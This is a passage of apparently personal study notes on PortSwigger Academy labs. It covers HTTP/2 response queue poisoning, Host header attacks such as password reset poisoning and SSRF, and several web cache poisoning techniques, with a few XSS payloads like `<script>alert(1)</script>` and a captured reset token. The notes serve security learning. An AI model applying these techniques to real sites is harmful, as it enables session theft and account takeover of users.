            - as usual, expand the Inspector's **Request Attributes** section and make sure the protocol is set to HTTP/2 and “allow http/2 alpn override”
            - according to the course part, when HTTP/2 downgrading is in play, we can also cause this split to occur in the headers instead.
            - This is also useful in cases where the `content-length` is validated and the back-end doesn't support chunked encoding.
            - we need to ensure that both requests received by the back-end contain a `Host` header because in the rewriting phrase, some front-end servers append the new `Host` header to the end of the current list of headers.
            - I suppose that the solution would simply be to try both, so I’ll perform the HTTP/2 request splitting supposing that the host header don’t get appended at the end and see if it works.
            - By injecting `\r\n` sequences, we split the request so that we're smuggling another request to a non-existent endpoint as follows :
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20398.png)
                
                - we confirm that the splitting is possible by appending a second `GET` to `/x`  and getting a `404`
                - there is no need of an `\r\n`  at the end, so you shouldn’t add it or your attack won’t work.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20399.png)
                
                - Send the request. When the front-end server appends `\r\n\r\n` to the end of the headers during downgrading, this effectively converts the smuggled prefix into a complete request, poisoning the response queue.
                - we can also do a POC like in the video solution where we send a `GET /` after our  forged request and check if it gets a 404.
                - while what we did here is just send a request twice
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20400.png)
                
            - Next, i changed the path to `/x`  in order to always get a 404 response (unless we’re viewing victim’s response )
                - Once you have poisoned the response queue, this will make it easier to recognize any other users' responses that you have successfully captured.
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20401.png)
                
                - after clicking few times, we got the http response from the successful login of the victim.
                - This means we performed [response queue poisoning](https://portswigger.net/web-security/request-smuggling/advanced/response-queue-poisoning)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20402.png)
                
            - Using cookie editor in firefox, we use the victim’s cookie, access admin panel and delete carlos
- HTTP Host header attacks
    - course link showing list of hacks to exploit host header injection
        
        [https://portswigger.net/web-security/host-header/exploiting](https://portswigger.net/web-security/host-header/exploiting)
        
    - Host header authentication bypass
        - lab description
            
            This lab makes an assumption about the privilege level of the user based on the HTTP Host header.
            
            To solve the lab, access the admin panel and delete Carlos's account.
            
        - we simply replace the value of the HOST header with [localhost](http://localhost) when accesing /admin
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20403.png)
            
        
    - Basic password reset poisoning
        - lab link
            
            [https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning](https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning/lab-host-header-basic-password-reset-poisoning)
            
        - steps
            - intercept carlos’s password reset request and change the host value to the exploit server
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20404.png)
                
            - we go to exploit’s sever’s access log to find the reset link
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20405.png)
                
            - we add that path to the app’s domain in order to reset carlos’s password
                
                `/forgot-password?temp-forgot-password-token=pX4CrpDtoDHiJj5wwLcEfObYVxDwBaPP`
                
        - similar lab done by ippsec
            
            [https://www.youtube.com/watch?v=KcYBV1L2w_s](https://www.youtube.com/watch?v=KcYBV1L2w_s)
            
        - we can also get the request in Colloborator or webhook.site
    - Web cache poisoning via ambiguous requests (unsolved)
        - lab link and detailled solution
            
            [https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-web-cache-poisoning-via-ambiguous-requests)
            
        - for this lab, i found that the video was easier to understand
            
            [https://youtu.be/2r00mmL1UYg](https://youtu.be/2r00mmL1UYg)
            
        - it took me 2 hours to understand that in this lab (unlike in the video or in real life), you can’t try all domains in the host header injection part, you have to use the exploit server
        - it also took me days to understand that this attack only works on `HTTP/1.1` and my burp was defaulting to `HTTP2`
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20406.png)
            
        - steps
            - it’s important to use a cache buster like `?a=b` or you will keep making a temporary dos when u fuzz
            - `x-cache` header
                
                , the terms "X-Cache hit" and "X-Cache miss" are typically used to indicate whether a requested resource was found in the cache or not. Here's a breakdown of each term:
                
                1. X-Cache Hit: When a request is made for a particular resource (e.g., a webpage, image, or file), and the cache server is able to find a copy of that resource in its cache, it is considered a "hit." This means that the requested resource is already stored in the cache, and the cache server can serve it directly to the user without having to fetch it from the original source. A cache hit generally results in faster response times and reduces the load on the origin server.
                2. X-Cache Miss: On the other hand, when a request is made for a resource, but the cache server does not have a copy of that resource in its cache, it is considered a "miss." In this case, the cache server needs to fetch the resource from the origin server to fulfill the request. A cache miss typically results in longer response times compared to a cache hit since the server needs to retrieve the resource from the original source.
                
                The "X-Cache" header is often included in the HTTP response headers to provide information about whether the requested resource was a cache hit or a cache miss. The header value can provide additional details about the cache operation, such as the specific cache server involved.
                
            - first check with Param miner failed
                - intercept request
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20407.png)
                    
                - repeater > right click > extensions > param miner > guess params > guess everything
                - it doesn’t identify anything so we move on
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20408.png)
                
            - notice that if you use the host header twice, the second one gets used
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20409.png)
                
            - the injected domain is used in an URL importing a javascript file
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20410.png)
                
            - so we host a malicious JS file in that exact path
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20411.png)
                
            - to confirm that our malicious javascript get used, we use “show response in browser”
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20412.png)
                
            - we remove the cache buster and keep pressing send until our request gets cached (X-Cache: hit and age > 0 )
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20413.png)
                
            - Then, we should see “congrats, you solved the lab”
            
    - Routing-based SSRF
        - lab link
            
            [https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-routing-based-ssrf)
            
        - steps
            - if we set the value of the host header to 127.0.0.1 we  get the following answering indicating that that the server tries to connect to that ip
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20414.png)
                
            - we confirm that by using the collaborator server
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20415.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20416.png)
                
            - now we iterate over 192.168.0/24 as value of the host header
            - you must UNCHECK the  button “Update HOST header to match target” to use intruder payloads in HOST header
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20417.png)
                
            - Using intruder,we found an admin panel in 192.168.0.24
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20418.png)
                
            - admin panel’s source code indicates that we must send a POST request
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20419.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20420.png)
                
            - follow redirection to solve the lab
    - SSRF via flawed request parsing
        - lab link
        - steps
            - after trying the list of hacks in the first bullet above, one of them worked
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20421.png)
                
            - we can poc host header injection by using a URL in the first line
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20422.png)
                
            - we use intruder like the previous lab
                - if you get a pop up about host header not matching the url, you should click “ignore” l
                - keep the domain of the the vulnerable application in the first line
                - It uses the endpoint from the first line (but with the domain we get from the Host header)
                - only 192.168.0.227 gave a 302 status code
                - to delete carlos, don’t forget to update the path with the value of the action of the form of deleting in the admin panel (check last screenshot)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20423.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20424.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20425.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20426.png)
                
    - Host validation bypass via connection state attack
        - more details about this attack
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20427.png)
            
            another article : 
            
            [https://portswigger.net/research/browser-powered-desync-attacks#state](https://portswigger.net/research/browser-powered-desync-attacks#state)
            
        - the idea should be clear from the description
            
            Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.
            
            To solve the lab, exploit this behavior to access an internal admin panel located at `192.168.0.1/admin`, then delete the user `carlos`.
            
            [https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)
            
        - you can confirm this using the 'connection-state probe' option in HTTP Request Smuggler.
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20428.png)
            
        - lab link and good solution solution
            
            [https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack](https://portswigger.net/web-security/host-header/exploiting/lab-host-header-host-validation-bypass-via-connection-state-attack)
            
        - notice that in the description we ask you to acess a specific host
            - steps
                - we add a normal request and the following request in one group (in burp repeater )
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20429.png)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20430.png)
                    
                - i set “Connection: keep-alive” in both requests and clicked **Send group in sequence (single connection)**
                - i was able to access admin panel and delete carlos by modifying the second request and resending the group of requests in a single connection
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20431.png)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20432.png)
                    
- Web Cache Poisoning
    - links and important notes
        - farah hawa video
            
            [youtube.com/watch?v=N6F2vngktrw](http://youtube.com/watch?v=N6F2vngktrw)
            
            - vanish software
                
                **Varnish** est un serveur de [cache](https://fr.wikipedia.org/wiki/Cache_web) [HTTP](https://fr.wikipedia.org/wiki/Hypertext_Transfer_Protocol) apparu en 2006 et distribué sous [licence BSD](https://fr.wikipedia.org/wiki/Licence_BSD).
                
                Déployé en tant que [proxy inverse](https://fr.wikipedia.org/wiki/Proxy_inverse) entre les [serveurs d'applications](https://fr.wikipedia.org/wiki/Serveur_d%27applications) et les clients, il permet de décharger les premiers en mettant en cache leurs données, selon des règles définies par l'administrateur système et les développeurs du [site](https://fr.wikipedia.org/wiki/Site_web), pour servir plus rapidement les requêtes, tout en allégeant la charge des serveurs.
                
                - The "X-Varnish" header is related to the Varnish Cache software, which is a popular HTTP accelerator and caching reverse proxy.
                - When a request passes through Varnish Cache, it may add the "X-Varnish" header to the response. This header provides information about the handling of the request by Varnish Cache, such as the request's unique identifier (known as the "XID") and other details related to caching and caching-related decisions made by Varnish.
                - The "X-Varnish" header typically consists of multiple values separated by a space. The first value represents the XID, which is a unique identifier assigned to each request by Varnish Cache.
                - The "Age" header is an HTTP response header that provides information about the age of a cached response in seconds. It is typically used in conjunction with caching mechanisms to indicate how long a response has been stored in a cache before being served to a client.
                
        - farah hawa article
            
            vulnerability number 7 in the following article 
            
            [https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/](https://labs.detectify.com/2021/09/30/10-types-web-vulnerabilities-often-missed/)
            
        - importance of using a cache buster
            
            **Caution:** When testing for unkeyed inputs on a live website, there is a risk of inadvertently causing the cache to serve your generated responses to real users. Therefore, it is important to make sure that your requests all have a unique cache key so that they will only be served to you. To do this, you can manually add a cache buster (such as a unique parameter) to the request line each time you make a request. Alternatively, if you are using Param Miner, there are options for automatically adding a cache buster to every request.
            
        - it can be important to switch to HTTP1.1 before doing this labs
            
            ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20433.png)
            
    - Exploiting cache design flaws
        - course
            
            [Exploiting cache design flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws)
            
        - Web cache poisoning with an unkeyed header
            - lab link
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-header)
                
            - course part
                
                check **Identify and evaluate unkeyed inputs** in the following link
                
                [https://portswigger.net/web-security/web-cache-poisoning](https://portswigger.net/web-security/web-cache-poisoning)
                
            - steps
                - intercept request > right click > param miner > guess everything (or only headers)
                - since this is burp pro we’ll get the finding in the Dashboard (issue activity)
                    - in burp community, we can see the finding in the extensions tab > installed > output
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20434.png)
                    
                - the finding showed that the value of the header gets reflected in the response’s html
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20435.png)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20436.png)
                    
                - since our injected domain is used to import `/resources/js/tracking.js` we’ll host a malicious version of that sript in the same endpoint
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20437.png)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20438.png)
                    
                - to confirm that our script got used, we can access the logs or use “show response in browser”
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20439.png)
                    
                - (optional)to do a poc of cache poisoning, we send the request many times and remove the header to make sure it gets cached (while keeping the cache buster)
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20440.png)
                    
                - finally, we repeat the same previous process but after removing the cache buster, we get our response cached, and solve the lab
                    
                    in the process of doing that, i got this “lab solved”
                    
                    ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20441.png)
                    
        - Web cache poisoning with an unkeyed cookie
            - lab link
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie)
                
            - lab description indicates that cookies aren't included in the cache key which means we”ll use them to poison the response.
            - so in “Param miner”, i’ll choose “guess cookies” (without the previous information, i would go with “guess everything” )
            - in the burp scanner(issue activity), we should have the finding “secret input : cookie”
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20442.png)
                
            - we can see that the cookie content gets reflected in the response
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20443.png)
                
            - i modified cookie content and url encoded may payload to trigger an alert (we confirm by showing the response in browser)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20444.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20445.png)
                
            - i just checked if cookie content gets url decoded and that was the case (it’s not a rule, depends on backend code)
            - then we remove the cache buster, and cache the response (i did cache /login first but it didn’t solve the lab, it should be / )
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20446.png)
                
        - Web cache poisoning with multiple headers
            - lab link
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-multiple-headers)
                
            - using Param miner we click “guess everything” and we get the following finding
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20447.png)
                
            - X-Forwarded-Scheme header
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20448.png)
                
            - reading about this header, we understand that it can have value such as http and https
            - when we give it another value aside from `https` (the protocol the app currently use) it returns 302 (like shown in the scanner)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20449.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20450.png)
                
            - if we add the the header `X-Forwarded-Host` to the previous request, we’ll get a 302 to the exploit server domain with the same endpoint of the request (`/aaaa` here)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20451.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20452.png)
                
            - the previous header was not found with Param miner. Apparently, it’s an important header that should be tried manually
            - quick reminders for the fools out there
                
                 we don’t try to change the value of the host header because it is used to determine if the response is cached or not (leyed inpyt) 
                
                we only test with the exploit server domain because it’s the only domain whitelisted
                
            - In order to exploit this behavior, we‘ll poison the javascript file loaded by the app by creating a malicious one in our server
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20453.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20454.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20455.png)
                
        - Targeted web cache poisoning using an unknown header
            - lab link
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws)
                
            - Notice that the responses contains the `Vary` header this time
            - theory part : Vary header
                
                The rudimentary way that the `Vary` header is often used can also provide attackers with a helping hand. The `Vary` header specifies a list of additional headers that should be treated as part of the cache key even if they are normally unkeyed. It is commonly used to specify that the `User-Agent` header is keyed, for example, so that if the mobile version of a website is cached, this won't be served to non-mobile users by mistake.
                
                This information can also be used to construct a multi-step attack to target a specific subset of users. For example, if the attacker knows that the `User-Agent` header is part of the cache key, by first identifying the user agent of the intended victims, they could tailor the attack so that only users with that user agent are affected. Alternatively, they could work out which user agent was most commonly used to access the site, and tailor the attack to affect the maximum number of users that way.
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws)
                
            - Using Param miner, we find that the the value of the header `x-host` gets reflected in the response and it is used to load a javascript file
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20456.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20457.png)
                
            - so we use the domain of the exploit server, host a malicious JS in the same path, and confirm that we get a pop up
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20458.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20459.png)
                
            - However, like expected, this doesn’t solve the lab, because `Vary: User-Agent` which means the `User-Agent` header is keyed
            - According to the description, A victim user will view any comments that you post.
            - So we will put a link to a malicious server and get the victim’s user agent (notice that html is allowed in the comment field)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20460.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20461.png)
                
            - we copy the victim’s user agent and add it to our request and remove the cache buster (don’t forget that or lab won’t be solved)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20462.png)
                
            - u should see “congrats …”
    - Exploiting cache implementation flaws
        - theory part
            
            [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws)
            
        - Web cache poisoning via an unkeyed query string
            - lab link
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)
                
            - Like stated in the lab description, the query (like `?a=b` is not keyed)
            - This means that two requests may get the same response even if the http parameters are different
            - This query is reflected in the response
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20463.png)
                
            - notice that ii used the `origin` header as a cache buster in the previous bullet
            - Other headers inside this bullet can be used, or check theory part
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20464.png)
                
            - Since query is reflected in html, we modify it to trigger a pop up
                
                in lab solution they simply use 1. `GET /?evil='/><script>alert(1)</script>`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20465.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20466.png)
                
            - Remove the cache-buster `Origin` header to solve the lab
            - a hint that i noticed after solving the lab,
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20467.png)
                
            - The hint is we can add `Pragma: x-get-cache-key` to an http request to get the cache key in the response headers
        - Web cache poisoning via an unkeyed query parameter
            - lab link
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-param)
                
            - theory part
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20468.png)
                
            - In the course, they mentioned that UTM parameters like `utm_content` are good candidates to check during testing
            - so i tried this http parameter in this lab and it was indeed not keyed, and also reflected
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20469.png)
                
            - Notice that i used `Pragma: x-get-cache-key` to get cached content (which is just hint, that we won’t find in real life)
            - A quick reminder that if `Age` > 0 the response is cached and you wait for the cache to expire to see the result of your request
            - like the previous lab, we modify the value of the reflected http parameter to trigger a pop up
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20470.png)
                
            - we remove the cache buster `a=zzzz` and change the endpoint to `/`  , resend the request many times until `Age: 0`
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20471.png)
                
        - Parameter cloaking
            - lab link (for good detailled solution)
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-param-cloaking)
                
            - theory part
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws)
                
                ****Cache parameter cloaking**** and specially ****Exploiting parameter parsing quirks****
                
            - looking at burp history, we find a weird JS file that looks like the callback they talked about in the course
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20472.png)
                
            - if we change the value of the function and keep sending it until it’s cached, we find that it gets injected/reflected in the JS file in the response
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20473.png)
                
            - so we modify the function name with `alert(1);//` (url encoded)  to trigger a pop up  later
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20474.png)
                
            - the excluded parameter they talked in the description is `utm_content` (the same as the previous lab)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20475.png)
                
            - we confirmed that in the previous screenshot by using  `Pragma: x-get-cache-key` to get the keyed part (and utm_content is not part of it as u can see)
            - i just tried the same hack as in the course of exploiting inconsistent parameter parsing between the cache and the back-end  that use the Ruby on Rails framework and it worked !
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20476.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20477.png)
                
            - why did this work ? ( check course for details)
                1. The Ruby on Rails framework interprets both ampersands (&) and semicolons (;) as delimiters.
                2. If there are duplicate parameters, each with different values, Ruby on Rails gives precedence to the final occurrence.
            - We can also checking this inconsistency in the parsing when Rails is used is using Param miner,
                
                param miner > param miner > railer param > cloack scan
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20478.png)
                
            - we remove the cache buster and change the endpoint to `/`  , resend the request many times until `Age: 0` to solve the lab
                
                
        - Web cache poisoning via a fat GET request
            - lab link
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-fat-get)
                
            - theory part
                
                check : ****Exploiting fat GET support****
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws)
                
            - according to the lab’s description, It accepts `GET` requests that have a body, but does not include the body in the cache key.
            - so i simply added another parameter in the body with the same name and with the value `alert();//` (not url encoded)  to solve the lab
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20479.png)
                
            - in real life, to check for the presence of this bug, we should use param miner > param miner > railer param > rails param cloacking scan
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20480.png)
                
            
        - URL normalization
            - lab link
                
                [https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-normalization)
                
            - if we browse to any non-existent path, we notice that the path gets reflected in the response
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20481.png)
                
            - if we try using an xss payload (in the browser, like the victim would), it won’t work because the payload gets URL-encoded
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20482.png)
                
            - but if we send the payload not encoded, our JS will be executed
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20483.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20484.png)
                
            - According to the lab’s description and the course, the caching implementation normalize keyed input when adding it to the cache key.
            - In this case, both of the following previous requests (using the payload url encoded and non url encoded )  have the same cache key.
            - to do a local poc, keep sending the request in repeater until it gets cached, and try using the payload in the browser (url encoded)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20485.png)
                
                ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20486.png)
                
            - you should be a bit fast, cache duration is 10 seconds in this lab
            - same process to to solve the lab, gets repeater request cached and send the link to the victim,
                
                
    
- SSTI
    - methodology
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20487.png)
        
    - Decision tree to identify the template
        
        ![Untitled](Portswigger%20Academy%20=Labs%201c291a7eb9bf4175b93b109fc8beaa25/Untitled%20488.png)
        
    - Basic server-side template injection
        - lab link
            
            [https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic) 
            
        - in the lab description, they mention that ERB template engine is used and we check should it’s documentation
            
